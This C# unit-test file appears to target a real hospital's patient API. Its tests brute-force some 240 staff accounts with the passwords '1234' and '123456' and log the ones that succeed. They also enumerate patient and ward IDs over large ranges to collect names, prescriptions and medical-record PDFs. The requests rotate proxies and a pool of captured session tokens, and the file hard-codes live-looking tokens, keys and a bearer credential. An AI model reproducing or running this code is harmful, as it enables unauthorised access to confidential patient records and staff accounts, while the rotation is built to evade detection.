using Autofac;
using HospitalJob.Jobs;
using Microsoft.EntityFrameworkCore;
using Microsoft.VisualStudio.TestPlatform.Utilities.Helpers;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Spire.Pdf;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using VaeDbContext;
using VaeEntity.Hospital;
using VaeHelper;

namespace VaeHelperTests.Hospital
{
    [TestClass]
    public class HospitalTest
    {
        private const string _url = "https://newapp.sysucc.org.cn:9017";
        private const string _token = "584be464eab04c7382ddf1f98b51401a";
        private const string _serviceKey = "839a1b4d0c6a4cabad474b8a4df46218";
        private IContainer container;
        private ProxyHelper _proxyHelper;
        private HospitalHelper _hospitalHelper;
        public HospitalTest()
        {
            container = TestInitialize.Initialize<HospitalJob.Startup>();
            _proxyHelper = container.Resolve<ProxyHelper>();
            _hospitalHelper = container.Resolve<HospitalHelper>();
        }

        [TestMethod]
        public void QueryAdvertisementTest()
        {
            var sign = GetSgin();// GetSgin();
            var url = $"{_url}/api/Common/QueryAdvertisement?sig={sign.sign}&token={_token}&timestamp={sign.tiemstamp}";
            url = $"{_url}/api/Patient/QueryTypicalPatient?sig={sign.sign}&token={_token}&timestamp={sign.tiemstamp}";
            url = $"{_url}/api/Patient/QuerySchema?sig={sign.sign}&token={_token}&timestamp={sign.tiemstamp}";
            //url = $"{_url}/api/User/GetPersonalIntro?sig={sign.sign}&token={_token}&timestamp={sign.tiemstamp}";
            var result = HttpHelper.Get(url, GetHeader()).Result;
            for (long index = 370000450220; index < 370000451253; index++)
            {
                url = $"{_url}/api/Patient/GetPatient?patientId=ZY{index}&sig={sign.sign}&token={_token}&timestamp={sign.tiemstamp}";
                result = HttpHelper.Get(url, GetHeader()).Result;
                if (result.ResponseString != "{\"msgCode\":0,\"msg\":\"成功\",\"data\":null}")
                {
                    Trace.WriteLine($"Id:{JObject.Parse(result.ResponseString).SelectToken("data.id")}");
                }
            }

        }
        [TestMethod]
        public void GetPatientTest()
        {
            var patient = _hospitalHelper.GetPatient("ZY030000560224").Result;

        }
        [TestMethod]
        public void QuerySeniorCadrePatientTest()
        {
            var sign = GetSgin();
            var pations = new List<JObject>();
            for (int pageIndex = 1; pageIndex < 5; pageIndex++)
            {
                var url = $"{_url}/api/Patient/QuerySeniorCadrePatient?sig={sign.sign}&token={_token}&timestamp={sign.tiemstamp}&mPageIndex={pageIndex}";
                var result = HttpHelper.Get(url, GetHeader()).Result;
                var pObject = JObject.Parse(result.ResponseString);
                pations.AddRange(pObject.SelectToken("data.patientList").Select(o => o as JObject));
            }
        }

        [TestMethod]
        public void LoginTest()
        {
            // var token = _hospitalHelper.Login("B01734", "123456").Result;
            var sign = GetSgin();
            var loginInfos = JsonConvert.DeserializeObject<Dictionary<string, string>>("{\"B00409\":\"123456\",\"B01433\":\"123456\",\"B01405\":\"123456\",\"B00794\":\"123456\",\"B01315\":\"123456\",\"B00751\":\"123456\",\"B01689\":\"123456\"}");
            var webProxy = _proxyHelper.GetProxy();
            var tokens = new List<string>();
            foreach (var loginInfo in loginInfos)
            {
                var token = _hospitalHelper.Login(loginInfo.Key, loginInfo.Value, webProxy).Result;
                tokens.Add(token.SelectToken("data.token").ToString());
            }
            Trace.WriteLine(string.Join(";", tokens));

        }
        [TestMethod]
        public void TestPasswordTest()
        {
            var loginIds = new List<string>() { "B00768", "B00748", "B01387", "B01436", "B00753", "B01131", "B01404", "110112", "B00773", "B000082", "B00799", "B00745", "B00065", "B01579", "B01132", "B01433", "B01114", "B01034", "B01160", "B00800", "108472", "B01435", "B01589", "B01416", "B01563", "B01305", "B00064", "106914", "B00767", "B01679", "B00749", "B00736", "B00781", "B00803", "B00760", "B00758", "B01413", "B01327", "B01529", "B01405", "B01196", "B01359", "B01151", "B01562", "B01159", "B01565", "B01304", "B01226", "B01599", "B01481", "B01170", "B01275", "B01633", "B01644", "B01273", "B00775", "B01618", "B01741", "B01534", "B00802", "B01069", "B01209", "B00744", "B01725", "B01423", "B00785", "B01615", "B01584", "B01479", "B01354", "B00794", "B01285", "B01793", "B01217", "B01163", "B01322", "B01414", "B01411", "B01006", "B00774", "B00974", "B01005", "B01099", "B01448", "B01286", "B01673", "B01626", "B01578", "B01418", "B01315", "B01535", "B01040", "B00555", "B00798", "B01316", "B00776", "B01349", "B00750", "B00784", "B00778", "B01541", "B01670", "B01342", "B01792", "B01108", "B01566", "B00551", "106342", "B01455", "B01072", "B00766", "B01531", "B01408", "B01033", "B01362", "B01284", "B00787", "B00369", "B01283", "B01430", "106916", "B01154", "B01543", "B01345", "B01130", "B01346", "B01650", "B01343", "B01544", "B01221", "B00070", "B01730", "B01153", "B01155", "B00965", "B01643", "B01319", "B01320", "B00073", "B01253", "B01620", "B00967", "106418", "B01195", "B01257", "B01111", "B01622", "B00738", "B01329", "B00740", "B00786", "B00789", "B01382", "B01017", "B01071", "B00969", "B01276", "B01282", "B01375", "B01165", "B01390", "B01619", "B01403", "B01361", "B01348", "T00560", "B01008", "B01395", "B01219", "B00374", "B00726", "B01281", "T00040", "B01161", "B01116", "106280", "B01077", "B00782", "B00746", "B00795", "B01134", "B01164", "B00970", "B01098", "B01213", "B01350", "B01406", "B01598", "B00777", "B01145", "B01208", "B01317", "B00017", "B01076", "B01291", "B01407", "B01429", "B01581", "B01617", "B00762", "B01274", "B00747", "B01030", "B00796", "B00371", "106336", "106937", "B01605", "B01568", "B01588", "B01623", "B01627", "B01103", "B01149", "B01057", "B01136", "B01415", "B01441", "B01443", "B01140", "B01422", "B01564", "B00756", "B00074", "B00805", "B01352", "B01060", "B00770", "B00751", "B01016", "B01214", "B01166", "B01445", "B01689", "B01602" };
            var passwordDic = new List<string>() { "1234", "123456" };

            var loginInfo = JsonConvert.DeserializeObject<Dictionary<string, string>>("{\"B00409\":\"123456\",\"B01433\":\"123456\",\"B01405\":\"123456\",\"B00794\":\"123456\",\"B01315\":\"123456\",\"B00751\":\"123456\",\"B01689\":\"123456\"}");
            var proxy = _proxyHelper.GetProxy();
            foreach (var loginId in loginIds.Where(l => !loginInfo.ContainsKey(l)))
            {
                foreach (var password in passwordDic)
                {
                    var token = _hospitalHelper.Login(loginId, password).Result;
                    if (token != null && (int)token["msgCode"] == 0)
                    {
                        Trace.WriteLine($"用户{loginId}登录密码:{password}");
                        loginInfo.Add(loginId, password);
                    }
                }
            }
            Trace.WriteLine($"查询完毕,账号密码:{Environment.NewLine}{JsonConvert.SerializeObject(loginInfo)}");
        }
        [TestMethod]
        public void QuerySchema()
        {
            var schemas = _hospitalHelper.QuerySchema().Result;
        }
        [TestMethod]
        public void QuerySchemaInpatientList()
        {
            var patients = _hospitalHelper.QuerySchemaInpatientList("1418602").Result;

        }
        [TestMethod]
        public void GetInPatientEmrPDFListTest()
        {
            var emrPdfList = _hospitalHelper.GetInPatientEmrPDFList("16106375").Result;
            var pdfUrl = _hospitalHelper.GetEmrPDFDetail(emrPdfList.FirstOrDefault()["documentNo"]?.ToString()).Result;

        }
        [TestMethod]
        public void QuerySchemaTest()
        {
            var tokenString = "b86aa764d92c4ddea0472792e3a3b11e;3cdf63cfb2a34306a9c441b06f199820;a9daad8734f348e08701ca8ed497f545;f0ca36015c0445bb88f7b5bd9039921d;a35ea8b991a745d78426d95e9cfb5795;4cdc5ebfa6904aa080a2316cb54a2178";
            var tokens = tokenString.Split(';');
            var patients = new List<Patient>();
            var webProxy = _proxyHelper.GetProxy();
            var schemaPatients = _hospitalHelper.QuerySchemaInpatientList("1360597", webProxy, tokens[0]).Result;

            for (int schemaIndex = 1345006; schemaIndex < 1362065; schemaIndex++)
            {
                var token = tokens[new Random(Guid.NewGuid().GetHashCode()).Next(0, tokens.Length)];
                for (int tryIndex = 0; tryIndex < 3; tryIndex++)
                {
                    try
                    {
                        schemaPatients = _hospitalHelper.QuerySchemaInpatientList(schemaIndex.ToString(), webProxy, token).Result;
                        break;
                    }
                    catch (WebException)
                    {
                        webProxy = _proxyHelper.GetProxy();
                    }
                }
                var valiedPatients = schemaPatients.Where(p => p.SeeNo != "0");
                patients.AddRange(valiedPatients);
                if (valiedPatients.Any())
                {
                    var first = valiedPatients.FirstOrDefault();
                    Trace.WriteLine($"{first.DeptId},{first.DeptName}{first.InDate}:{string.Join(";", valiedPatients.Select(p => p.Name))}");
                }
            }
            LogHelper.Instance.WriteConfig("Patiens", JsonConvert.SerializeObject(patients));
        }
        [TestMethod]
        public void QueryOutPatientEmrPDFTest()
        {
            var queryOutPatientEmrPDFService = container.Resolve<QueryOutPatientEmrPDFService>();
            queryOutPatientEmrPDFService.Excute("伊班膦酸", new DateTime(2022, 03, 01), new DateTime(2022, 04, 01));
        }

        [TestMethod]
        public void QueryOutPatientPrescriptTest()
        {
            var medications = _hospitalHelper.QueryOutPatientPrescript("0000585221", "17884538").Result;

            var patients = JsonConvert.DeserializeObject<List<Patient>>(LogHelper.Instance.ReadConfig("Patiens"));
            foreach (var patient in patients.Where(p => !p.DeptName.Contains("放射") && !p.DeptName.Contains("放疗")))
            {
                var patientObj = JObject.Parse(patient.PatientContent);
                medications = _hospitalHelper.QueryOutPatientPrescript(patientObj["visitId"].ToString(), patient.Id, _proxyHelper.GetProxy()).Result;
            }
        }
        [TestMethod]
        public void QueryDeptPatientListTest()
        {
            var timestamp = DateTimeHelper.ConvertDateTimeToLong(DateTime.Now);
            var sign = GetSgin();
            var url = $"{_url}/api/Patient/QueryDeptPatientList?sig={sign.sign}&token={_token}&timestamp={sign.tiemstamp}&deptId=12I3";
            var result = HttpHelper.Get(url, GetHeader()).Result;
        }
        [TestMethod]
        public void QueryDeptPatientListTest1()
        {
            //var depts = _hospitalHelper.QueryDeptList().Result;

            var orders = _hospitalHelper.QueryDeptPatientList("20I8").Result;
        }
        [TestMethod]
        public void QueryHitoryVisitTest()
        {
            var pationVisits = _hospitalHelper.QueryMyMarkPatientDetail("0000585221").Result;
        }
        [TestMethod]
        public void QueryInpatientInfoForDocTest()
        {
            var patients = _hospitalHelper.QueryInpatientInfoForDoc("ZY010000552540", webProxy: _proxyHelper.GetProxy()).Result;

        }
        [TestMethod]
        public void QueryLongTermOrderListNewTest()
        {
            var longTermResult = _hospitalHelper.QueryLongTermOrderList("ZY010000591430").Result;
            var reuslt = _hospitalHelper.QueryTempOrderList("ZY010000591430").Result;
        }
        [TestMethod]
        public void QueryTempOrderListTest()
        {
            var orders = _hospitalHelper.QueryTempOrderList("ZY030000405018", webProxy: _proxyHelper.GetProxy()).Result;
        }


        [TestMethod]
        public void Md5Test()
        {
            var timestamp = "1642728986258";
            var serviceKey = "839a1b4d0c6a4cabad474b8a4df46218";
            var content = $"6e7b872de1754dfeb9d979ebb7e77e3a{serviceKey}{timestamp}";
            var result = GetSgin();

        }
        public static WebHeaderCollection GetHeader()
        {
            var headers = new WebHeaderCollection();
            headers.Add("Authorization", "Bearer vPGobLnVIqGiRhgHUhpakO7ff3QnBKuE-pclzaM0-PzT2wNoTFXsJ-jaP8LSnO9NWtOj1M1YY676yaqh0XlVwGKbDnaF78CB8lFW1NtbGXLatlHd3xJOhXviX4egUZJBJBzEZWok4VgAE17z6fNsWSK_kYlRu64NtjVX5lrAnOzROHBhEjiB--EcgzrqJwJJdI3403IP91e5RhaJfpRkPBhBaUKoteBRos1CoUGMq9jxKhyK-7NBCTYNq-B1eKPS0jDI9DHRI953jRwWKYiBby873N-DeBbUEI82ZhbOyUiT0mp30uc8zZ-Yg79HS0vUn5JpthDMQBFOBPrXcoAG_fN7gHhbiBr3eI99X2fh4OleRy6qAK8sPIKA-6_L8AAtuTS-MlAOP3o2o30F-AMbjqoYdLZ8L3x-1mpHIO8Yp3CMOKfdx-Vtp6pvyn-M1igWJXkWiIydE_ueWS2K-77coUzWLhMnVcHZOZTj5cJ1mwlLV8z9Ock6lxYgkgYWREVXGqHEZsx7p7GggZQINRXJoVacCoiGKEVJxjhMguWLiYBGy-cBGFAhPgFCymnqkctTSNe_Fv_CfqEs533kKcEIOugjDfkVVt0vFYWAo0V74CI9X5akERYBucvM8pNSHkRd18HQF4DrlnaIXT8giJeSm0RndE_gQItZ6es-N3xcYfWdlq-Tdela34CsxtwThKy7W30Y24ifBkIJUUxOyT9VIXoxnLbgBGcyxvLed91WfoTkWiyH2O91kCyd2bONm-9h");
            headers.Add("RandomNum", "73");
            headers.Add("UserName", "zszl@sysucc.org.cn");
            headers.Add("TimeStamp", "2022-01-21 09:36:26");
            headers.Add("Sign", "jnBOklEAnjpLvrLwgx42eW9ML8YceRnBJ3atFtbsiO121XapGgoV7rt8M0MBwHd6GLn+MR4SjD2MPbPe7OxI1sjuNMIwKN6HJRQiutnySL9rrKhlNFiWa5ic1pjEmcro1INMu7zOyb2XxJS/xf583WPPXqSP3pAlLHQ7N7Iz2Mo=");
            return headers;
        }
        public static (string sign, long tiemstamp) GetSgin()
        {
            var timestamp = DateTimeHelper.ConvertDateTimeToLong(DateTime.Now);
            var sign = $"6e7b872de1754dfeb9d979ebb7e77e3a{Guid.NewGuid().ToString("N")}{timestamp}";
            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
            var hash = md5.ComputeHash(Encoding.UTF8.GetBytes(sign));
            StringBuilder hex = new StringBuilder(hash.Length * 2);

            foreach (var byteH in hash)
            {
                if ((byteH & 255) < 16)
                {
                    hex.Append(0);
                }
                hex.Append(Convert.ToString(byteH & 255, 16));
            }
            return (hex.ToString(), timestamp);
        }
    }
}
